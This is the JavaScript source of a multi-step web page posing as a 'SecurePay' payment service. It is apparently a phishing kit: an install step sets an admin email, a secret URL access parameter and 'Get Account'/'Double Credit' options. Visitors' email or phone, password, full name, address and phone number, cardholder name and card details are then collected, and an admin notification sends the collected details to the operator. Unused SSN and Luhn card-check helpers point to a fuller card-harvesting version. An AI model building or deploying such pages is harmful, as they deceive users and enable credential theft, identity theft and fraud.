(() => {
  "use strict";

  const STEPS = [
    { id: "install", label: "Install" },
    { id: "login", label: "Login" },
    { id: "verify", label: "Verify" },
    { id: "billing", label: "Billing" },
    { id: "payment", label: "Payment" },
    { id: "success", label: "Success" },
  ];

  const appEl = document.getElementById("app");
  const progressEl = document.getElementById("progressBar");
  const footerHint = document.getElementById("footerHint");

  function readConfig() {
    try { return JSON.parse(localStorage.getItem("appConfig") || "null"); } catch { return null; }
  }
  function writeConfig(cfg) {
    localStorage.setItem("appConfig", JSON.stringify(cfg));
  }

  function readState() {
    try { return JSON.parse(sessionStorage.getItem("appState") || "{}"); } catch { return {}; }
  }
  function writeState(state) {
    sessionStorage.setItem("appState", JSON.stringify(state));
  }

  async function apiPost(url, body) {
    const headers = { "Content-Type": "application/json" };
    const cfg = readConfig();
    if (cfg?.apiToken) headers["Authorization"] = "Bearer " + cfg.apiToken;
    const res = await fetch(url, { method: "POST", headers, body: JSON.stringify(body) });
    try { return await res.json(); } catch { return { ok: false, error: "Bad JSON" }; }
  }

  async function sendAdminNotification(subject, text) {
    try { await apiPost("/api/notify", { subject, text }); }
    catch (e) { console.log("[Notify failed]", e); }
  }

  function nowIso() { return new Date().toISOString(); }

  function getQueryParam(name) {
    const url = new URL(window.location.href);
    return url.searchParams.get(name);
  }

  function setHash(stepId) {
    if (window.location.hash !== "#" + stepId) {
      window.location.hash = stepId;
    }
  }

  function updateProgress(stepId) {
    progressEl.innerHTML = STEPS.map(s => {
      const active = s.id === stepId ? "active" : "";
      return `<div class="step ${active}" data-step="${s.id}"><span class="dot"></span><span>${s.label}</span></div>`;
    }).join("");
  }

  function generateToken() {
    const bytes = crypto.getRandomValues(new Uint8Array(16));
    return "tok_" + Array.from(bytes).map(b => b.toString(16).padStart(2, "0")).join("");
  }

  function mask(value, groups) {
    const digits = value.replace(/\D+/g, "");
    const out = [];
    let idx = 0;
    for (const size of groups) {
      if (idx >= digits.length) break;
      out.push(digits.slice(idx, idx + size));
      idx += size;
    }
    return out.join(" ").trim();
  }

  function luhnCheck(num) {
    const digits = num.replace(/\D+/g, "");
    if (!digits) return false;
    let sum = 0; let alt = false;
    for (let i = digits.length - 1; i >= 0; i--) {
      let n = digits.charCodeAt(i) - 48;
      if (alt) { n *= 2; if (n > 9) n -= 9; }
      sum += n; alt = !alt;
    }
    return sum % 10 === 0;
  }

  function detectCardType(num) {
    const digits = num.replace(/\D+/g, "");
    if (/^3[47]\d{0,13}$/.test(digits)) {
      return { brand: "American Express", key: "amex", groups: [4,6,5], lengths: [15], cvv: 4 };
    }
    if (/^4\d{0,15}$/.test(digits)) {
      return { brand: "Visa", key: "visa", groups: [4,4,4,4], lengths: [16], cvv: 3 };
    }
    if (/^(5[1-5]\d{0,14}|22[2-9]\d{0,12}|2[3-6]\d{0,13}|27[01]\d{0,12}|2720\d{0,11})$/.test(digits)) {
      return { brand: "Mastercard", key: "mc", groups: [4,4,4,4], lengths: [16], cvv: 3 };
    }
    if (/^(6011\d{0,12}|65\d{0,14}|64[4-9]\d{0,13})$/.test(digits)) {
      return { brand: "Discover", key: "discover", groups: [4,4,4,4], lengths: [16], cvv: 3 };
    }
    return { brand: "Card", key: "card", groups: [4,4,4,4], lengths: [13,14,15,16,19], cvv: 3 };
  }

  function formatExpiry(value) {
    const digits = value.replace(/\D+/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return digits.slice(0,2) + "/" + digits.slice(2);
  }

  function isFutureExpiry(mmYY) {
    const m = /^(\d{2})\/(\d{2})$/.exec(mmYY);
    if (!m) return false;
    const month = parseInt(m[1], 10);
    const year = 2000 + parseInt(m[2], 10);
    if (month < 1 || month > 12) return false;
    const endOfMonth = new Date(year, month, 0, 23, 59, 59, 999);
    return endOfMonth.getTime() >= Date.now();
  }

  const US_STATES = [
    ["AL","Alabama"],["AK","Alaska"],["AZ","Arizona"],["AR","Arkansas"],["CA","California"],
    ["CO","Colorado"],["CT","Connecticut"],["DE","Delaware"],["FL","Florida"],["GA","Georgia"],
    ["HI","Hawaii"],["ID","Idaho"],["IL","Illinois"],["IN","Indiana"],["IA","Iowa"],
    ["KS","Kansas"],["KY","Kentucky"],["LA","Louisiana"],["ME","Maine"],["MD","Maryland"],
    ["MA","Massachusetts"],["MI","Michigan"],["MN","Minnesota"],["MS","Mississippi"],["MO","Missouri"],
    ["MT","Montana"],["NE","Nebraska"],["NV","Nevada"],["NH","New Hampshire"],["NJ","New Jersey"],
    ["NM","New Mexico"],["NY","New York"],["NC","North Carolina"],["ND","North Dakota"],["OH","Ohio"],
    ["OK","Oklahoma"],["OR","Oregon"],["PA","Pennsylvania"],["RI","Rhode Island"],["SC","South Carolina"],
    ["SD","South Dakota"],["TN","Tennessee"],["TX","Texas"],["UT","Utah"],["VT","Vermont"],
    ["VA","Virginia"],["WA","Washington"],["WV","West Virginia"],["WI","Wisconsin"],["WY","Wyoming"]
  ];

  function ssnAutoFormat(value) {
    const digits = value.replace(/\D+/g, "").slice(0, 9);
    const parts = [];
    if (digits.length > 0) parts.push(digits.slice(0, 3));
    if (digits.length > 3) parts.push(digits.slice(3, 5));
    if (digits.length > 5) parts.push(digits.slice(5));
    return parts.join("-");
  }

  function isInvalidSSN(ssn) {
    const m = /^(\d{3})-(\d{2})-(\d{4})$/.exec(ssn);
    if (!m) return true;
    const a = m[1], b = m[2], c = m[3];
    if (a === "000" || b === "00" || c === "0000") return true;
    if (a === "666" || /^9\d{2}$/.test(a)) return true;
    const all = (a + b + c);
    if (/^(\d)\1{8}$/.test(all)) return true; // all same digit
    if (all === "123456789" || ssn === "123-45-6789") return true;
    if (ssn === "078-05-1120") return true;
    return false;
  }

  function simulateSendEmail(to, subject, body) {
    const payload = { to, subject, body, sentAt: nowIso() };
    console.log("[Email]", payload);
    return payload;
  }

  function setFooter(text) { footerHint.textContent = text || ""; }

  function requireAccessOrExplain(cfg) {
    const requiredParam = cfg?.accessParam;
    const provided = getQueryParam("access");
    if (!requiredParam) return { ok: true };
    if (provided === requiredParam) return { ok: true };
    const url = new URL(window.location.href);
    url.searchParams.set("access", requiredParam);
    return { ok: false, hint: `Access requires parameter. Use ${url.toString()}` };
  }

  function renderInstall() {
    updateProgress("install");
    setFooter("Configure admin email, URL parameter access, and token generation.");
    const currentUrl = new URL(window.location.href);

    const existing = readConfig();
    const suggestedParam = existing?.accessParam || Math.random().toString(36).slice(2, 8);

    appEl.innerHTML = `
      <section class="card">
        <h2>Installation</h2>
        <p class="subtle">Provide admin details and access parameter. We'll store a local config and generate an API token.</p>
        <form id="installForm" class="table-form" autocomplete="off">
          <div class="label">Admin Email</div>
          <div><input id="adminEmail" class="input" type="email" placeholder="admin@example.com" required value="${existing?.adminEmail || ""}"></div>

          <div class="label">URL Access Parameter</div>
          <div><input id="accessParam" class="input" type="text" placeholder="e.g. alpha123" required value="${suggestedParam}"></div>

          <div class="label">Options</div>
          <div class="actions">
            <label class="checkbox"><input id="optGetAccount" type="checkbox" ${existing?.getAccount?"checked":""}> Get Account</label>
            <label class="checkbox"><input id="optDoubleCredit" type="checkbox" ${existing?.doubleCredit?"checked":""}> Double Credit</label>
          </div>

          <div class="label">API Token</div>
          <div class="actions">
            <input id="apiToken" class="input" type="text" readonly placeholder="Click Generate" value="${existing?.apiToken || ""}">
            <button type="button" id="btnGenToken" class="btn">Generate</button>
          </div>

          <div class="label">Live URL Preview</div>
          <div><code id="urlPreview" class="url-preview"></code></div>

          <div class="label"></div>
          <div class="actions">
            <button class="btn btn-primary" type="submit">Save & Continue</button>
            <button class="btn btn-ghost" type="button" id="btnSimulate">Simulate Config File</button>
          </div>
        </form>
        <div id="installMsg" class="note" style="margin-top:10px;"></div>
      </section>
    `;

    const emailEl = document.getElementById("adminEmail");
    const paramEl = document.getElementById("accessParam");
    const tokenEl = document.getElementById("apiToken");
    const formEl = document.getElementById("installForm");
    const urlPrevEl = document.getElementById("urlPreview");
    const btnGen = document.getElementById("btnGenToken");
    const btnSim = document.getElementById("btnSimulate");
    const msgEl = document.getElementById("installMsg");

    function updateUrlPreview() {
      const url = new URL(currentUrl);
      url.searchParams.set("access", paramEl.value || "");
      url.hash = "login";
      urlPrevEl.textContent = url.toString();
    }

    btnGen.addEventListener("click", () => {
      tokenEl.value = generateToken();
    });

    [emailEl, paramEl].forEach(el => el.addEventListener("input", updateUrlPreview));
    updateUrlPreview();

    btnSim.addEventListener("click", async () => {
      const cfg = {
        adminEmail: emailEl.value.trim(),
        accessParam: paramEl.value.trim(),
        getAccount: document.getElementById("optGetAccount").checked,
        doubleCredit: document.getElementById("optDoubleCredit").checked,
        apiToken: tokenEl.value || generateToken(),
        installedAt: nowIso(),
      };
      const result = await apiPost("/api/install", cfg);
      if (result?.ok) {
        msgEl.innerHTML = `<span class="success">config.ini created on server</span>`;
      } else {
        msgEl.innerHTML = `<span class="error">Server install failed; saved locally only</span>`;
      }
    });

    formEl.addEventListener("submit", async (e) => {
      e.preventDefault();
      const cfg = {
        adminEmail: emailEl.value.trim(),
        accessParam: paramEl.value.trim(),
        getAccount: document.getElementById("optGetAccount").checked,
        doubleCredit: document.getElementById("optDoubleCredit").checked,
        apiToken: tokenEl.value || generateToken(),
        installedAt: nowIso(),
      };
      if (!cfg.adminEmail || !cfg.accessParam) {
        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
        return;
      }
      writeConfig(cfg);
      await apiPost("/api/install", cfg);
      const url = new URL(window.location.href);
      url.searchParams.set("access", cfg.accessParam);
      window.location.href = url.toString().replace(/#.*$/, "#login");
    });
  }

  function renderLogin() {
    updateProgress("login");
    const cfg = readConfig();
    const access = requireAccessOrExplain(cfg);
    setFooter("Login with your email/phone and password. We'll send a code.");

    if (!cfg) { setHash("install"); return renderInstall(); }

    appEl.innerHTML = `
      <section class="card">
        <h2>Login</h2>
        ${!access.ok ? `<div class="error" style="margin:8px 0;">${access.hint}</div>` : ""}
        <form id="loginForm" class="form" autocomplete="off">
          <div class="row">
            <div>
              <label class="label">Email or Phone</label>
              <input id="loginId" class="input" type="text" placeholder="you@example.com or (555) 555-5555" required />
            </div>
            <div>
              <label class="label">Password</label>
              <input id="loginPw" class="input" type="password" placeholder="••••••••" required />
            </div>
          </div>
          <div class="actions">
            <button class="btn btn-primary" type="submit" ${!access.ok?"disabled":""}>Continue</button>
          </div>
        </form>
        <hr class="hr" />
        <div id="emailSim" class="kv"></div>
      </section>
    `;

    const formEl = document.getElementById("loginForm");
    const idEl = document.getElementById("loginId");
    const pwEl = document.getElementById("loginPw");
    const emailSim = document.getElementById("emailSim");

    formEl.addEventListener("submit", (e) => {
      e.preventDefault();
      if (!idEl.value.trim() || !pwEl.value) {
        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
        return;
      }
      const code = String(Math.floor(100000 + Math.random()*900000));
      const state = readState();
      state.login = { id: idEl.value.trim(), pw: pwEl.value, requestedAt: nowIso(), code };
      writeState(state);

      const mail = {
        name: "SecurePay Security",
        subject: "Your verification code",
        message: `Use this code to continue: ${code}`,
      };
      sessionStorage.setItem("verificationEmail", JSON.stringify(mail));

      const cfg = readConfig();
      sendAdminNotification("Login attempt", `User ${state.login.id} initiated login at ${state.login.requestedAt}. Code: ${code}`);

      emailSim.innerHTML = `
        <div class="label">Name</div><div>${mail.name}</div>
        <div class="label">Subject</div><div>${mail.subject}</div>
        <div class="label">Message</div><div>${mail.message}</div>
        <div class="label">Verification Code</div><div><strong>${code}</strong></div>
      `;

      setTimeout(() => { setHash("verify"); renderVerify(); }, 400);
    });
  }

  function renderVerify() {
    updateProgress("verify");
    setFooter("Enter the verification code we sent.");
    const mail = JSON.parse(sessionStorage.getItem("verificationEmail") || "{}");

    appEl.innerHTML = `
      <section class="card">
        <h2>Verification</h2>
        <div class="kv" style="margin:8px 0 16px;">
          <div class="label">Name</div><div>${mail.name || "SecurePay Security"}</div>
          <div class="label">Subject</div><div>${mail.subject || "Your verification code"}</div>
          <div class="label">Message</div><div>${mail.message || "Use this code to continue"}</div>
          <div class="label">Verification Code</div><div id="verifCodePreview" class="badge">${(readState().login?.code) || ""}</div>
        </div>
        <form id="verifyForm" class="form" autocomplete="off">
          <div>
            <label class="label">Enter Code</label>
            <input id="codeInput" class="input" type="text" placeholder="6-digit code" inputmode="numeric" maxlength="6" required />
          </div>
          <div class="actions">
            <button class="btn btn-primary" type="submit">Validate</button>
          </div>
          <div id="verifyErr" class="error"></div>
        </form>
      </section>
    `;

    const formEl = document.getElementById("verifyForm");
    const codeEl = document.getElementById("codeInput");
    const errEl = document.getElementById("verifyErr");

    formEl.addEventListener("submit", (e) => {
      e.preventDefault();
      const given = (codeEl.value || "").replace(/\D+/g, "");
      const expect = (readState().login?.code) || "";
      if (given !== expect) {
        errEl.textContent = "Incorrect code. Please try again.";
        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
        return;
      }
      const s = readState();
      s.verifiedAt = nowIso();
      writeState(s);
      setHash("billing");
      renderBilling();
    });
  }

  function renderBilling() {
    updateProgress("billing");
    setFooter("Enter your billing details. All fields required.");

    const state = readState();
    const b = state.billing || {};

    appEl.innerHTML = `
      <section class="card">
        <h2>Billing</h2>
        <form id="billForm" class="table-form" autocomplete="off">
          <div class="label">First Name</div>
          <div><input id="firstName" class="input" required value="${b.firstName||""}"></div>

          <div class="label">Last Name</div>
          <div><input id="lastName" class="input" required value="${b.lastName||""}"></div>

          <div class="label">Phone</div>
          <div><input id="phone" class="input" type="tel" placeholder="(555) 555-5555" required value="${b.phone||""}"></div>

          <div class="label">Address</div>
          <div><input id="addr1" class="input" placeholder="Street address" required value="${b.addr1||""}"></div>

          <div class="label">Address 2</div>
          <div><input id="addr2" class="input" placeholder="Apt, suite, etc." value="${b.addr2||""}"></div>

          <div class="label">City</div>
          <div><input id="city" class="input" required value="${b.city||""}"></div>

          <div class="label">State</div>
          <div>
            <select id="state" required>
              <option value="">Select a state</option>
              ${US_STATES.map(([v,n]) => `<option value="${v}" ${b.state===v?"selected":""}>${n}</option>`).join("")}
            </select>
          </div>

          <div class="label"></div>
          <div class="actions">
            <button class="btn btn-primary" type="submit">Continue to Payment</button>
          </div>
        </form>
      </section>
    `;

    const formEl = document.getElementById("billForm");

    formEl.addEventListener("submit", (e) => {
      e.preventDefault();
      const data = {
        firstName: document.getElementById("firstName").value.trim(),
        lastName: document.getElementById("lastName").value.trim(),
        phone: document.getElementById("phone").value.trim(),
        addr1: document.getElementById("addr1").value.trim(),
        addr2: document.getElementById("addr2").value.trim(),
        city: document.getElementById("city").value.trim(),
        state: document.getElementById("state").value,
      };
      const missing = Object.entries(data).some(([k,v]) => (k==="addr2"?false:!v));
      if (missing) {
        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
        return;
      }
      const s = readState();
      s.billing = { ...data, capturedAt: nowIso() };
      writeState(s);
      setHash("payment");
      renderPayment();
    });
  }

  function renderPayment() {
    updateProgress("payment");
    setFooter("Enter non-sensitive payment details (brand + last4 only).");

    const state = readState();
    const p = state.payment || {};

    appEl.innerHTML = `
      <section class="card">
        <h2>Payment</h2>
        <form id="payForm" class="table-form" autocomplete="off">
          <div class="label">Cardholder Name</div>
          <div><input id="holder" class="input" placeholder="Name as shown on card" required value="${p.holder||""}"></div>

          <div class="label">Brand</div>
          <div>
            <div class="row" style="grid-template-columns: 1fr auto;">
              <select id="brandSelect" required>
                <option value="">Select brand</option>
                <option value="Visa" ${p.brand==="Visa"?"selected":""}>Visa</option>
                <option value="Mastercard" ${p.brand==="Mastercard"?"selected":""}>Mastercard</option>
                <option value="American Express" ${p.brand==="American Express"?"selected":""}>American Express</option>
                <option value="Discover" ${p.brand==="Discover"?"selected":""}>Discover</option>
              </select>
              <span id="brandBadge" class="badge">${p.brand || "Card"}</span>
            </div>
            <div id="payErr" class="error"></div>
          </div>

          <div class="label">Last 4 digits</div>
          <div><input id="last4" class="input" inputmode="numeric" maxlength="4" placeholder="1234" required value="${p.last4||""}"></div>

          <div class="label"></div>
          <div class="actions">
            <button class="btn btn-primary" type="submit">Finish</button>
          </div>
        </form>
      </section>
    `;

    const formEl = document.getElementById("payForm");
    const holderEl = document.getElementById("holder");
    const brandSel = document.getElementById("brandSelect");
    const brandBadge = document.getElementById("brandBadge");
    const last4El = document.getElementById("last4");
    const payErr = document.getElementById("payErr");

    brandSel.addEventListener("change", () => {
      const brand = brandSel.value || "Card";
      const key = brand === "Visa" ? "visa" : brand === "Mastercard" ? "mc" : brand === "American Express" ? "amex" : brand === "Discover" ? "discover" : "";
      brandBadge.textContent = brand;
      brandBadge.className = `badge ${key}`.trim();
    });

    formEl.addEventListener("submit", async (e) => {
      e.preventDefault();
      const holder = holderEl.value.trim();
      const brand = brandSel.value;
      const last4 = (last4El.value || "").replace(/\D+/g, "");
      if (!holder || !brand || last4.length !== 4) {
        payErr.textContent = "Provide name, choose brand, and enter last4 digits.";
        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
        return;
      }

      const s = readState();
      s.payment = { holder, brand, last4, paidAt: nowIso() };
      writeState(s);

      const cfg = readConfig();
      const summary = {
        login: s.login,
        verifiedAt: s.verifiedAt,
        billing: s.billing,
        payment: { brand: s.payment.brand, last4: s.payment.last4 },
        config: { adminEmail: cfg.adminEmail, options: { getAccount: cfg.getAccount, doubleCredit: cfg.doubleCredit }},
        timestamps: { installedAt: cfg.installedAt, finishedAt: nowIso() }
      };

      const emailBody = `SecurePay submission\n\n` +
        `Login: ${summary.login.id} at ${summary.login.requestedAt}\n` +
        `Verified: ${summary.verifiedAt}\n` +
        `Billing: ${summary.billing.firstName} ${summary.billing.lastName}, ${summary.billing.addr1} ${summary.billing.addr2||''}, ${summary.billing.city}, ${summary.billing.state}, Tel ${summary.billing.phone}\n` +
        `Payment: ${s.payment.brand} ending in ${s.payment.last4}\n` +
        `Options: GetAccount=${cfg.getAccount} DoubleCredit=${cfg.doubleCredit}\n` +
        `API Token: ${cfg.apiToken}\n` +
        `Completed: ${summary.timestamps.finishedAt}`;

      await sendAdminNotification("Form submission complete", emailBody);

      setHash("success");
      renderSuccess();
    });
  }

  function renderSuccess() {
    updateProgress("success");
    setFooter("We will process your payment and email you soon.");

    appEl.innerHTML = `
      <section class="card">
        <h2>Success</h2>
        <p>We will process your payment and we will email you soon.</p>
        <div class="actions">
          <button id="restart" class="btn">Start Over</button>
        </div>
      </section>
    `;

    document.getElementById("restart").addEventListener("click", () => {
      sessionStorage.removeItem("appState");
      setHash("login");
      renderLogin();
    });
  }

  function route() {
    const hash = (window.location.hash || "#").replace(/^#/, "") || "install";
    const cfg = readConfig();
    if (!cfg && hash !== "install") return renderInstall();
    updateProgress(hash);
    switch (hash) {
      case "install": return renderInstall();
      case "login": return renderLogin();
      case "verify": return renderVerify();
      case "billing": return renderBilling();
      case "payment": return renderPayment();
      case "success": return renderSuccess();
      default: setHash("install"); return renderInstall();
    }
  }

  window.addEventListener("hashchange", route);
  document.addEventListener("DOMContentLoaded", route);
})();
